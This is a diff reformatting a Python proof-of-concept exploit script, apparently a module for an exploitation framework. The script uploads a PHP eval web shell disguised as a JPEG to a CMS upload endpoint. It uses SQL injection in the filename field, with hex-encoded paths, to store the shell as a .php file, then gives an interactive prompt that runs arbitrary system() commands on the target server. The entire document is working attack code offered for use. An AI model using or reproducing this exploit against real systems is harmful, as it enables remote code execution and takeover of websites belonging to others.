@@ -1,7 +1,9 @@
-from lib.core.data import target
-import urlparse
-import requests
 import re
+import urlparse
+
+import requests
+
+from lib.core.data import target
 
 
 def poc():
@@ -16,10 +18,11 @@ def poc():
         phpshell = "<?php eval($_POST['" + password + "']);?>"
         # phpshell = "<?php phpinfo(); ?>"
         url1 = target.url + "?c=upload&f=save"
-        files1 = [('upfile', (
-            "1','r7ip15ijku7jeu1s1qqnvo9gj0','30',''),('1',0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,'',0x7265732f746573742e706870,'1495536080','2.jpg",
-            phpshell, 'image/jpg')),
-                  ]
+        files1 = [
+            ('upfile',
+             ("1','r7ip15ijku7jeu1s1qqnvo9gj0','30',''),('1',0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,'',0x7265732f746573742e706870,'1495536080','2.jpg",
+              phpshell, 'image/jpg')),
+        ]
         r = requests.post(url1, files=files1, cookies=cookies)
         response = r.text
         id = re.search('"id":"(\d+)"', response, re.S).group(1)
@@ -27,8 +30,7 @@ def poc():
 
         url2 = target.url + '?c=upload&f=replace&oldid=%d' % id
         files2 = [
-            ('upfile',
-             ('1.jpg', phpshell, 'image/jpg')),
+            ('upfile', ('1.jpg', phpshell, 'image/jpg')),
         ]
         r = requests.post(url2, files=files2, cookies=cookies)
 
@@ -41,9 +43,7 @@ def poc():
                 command = raw_input("[*] input the command:")
                 payload = 'system("%s");' % command
                 if command != "exit":
-                    postData = {
-                        password: payload
-                    }
+                    postData = {password: payload}
                     r = requests.post(shell, data=postData)
                     print(r.text.encode(r.encoding))
                 else:
@@ -52,6 +52,7 @@ def poc():
                 print("[*] type 'exit' to quit")
                 pass
 
-        print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
     except KeyError as e:
-        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
+        print(
+            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
+        )
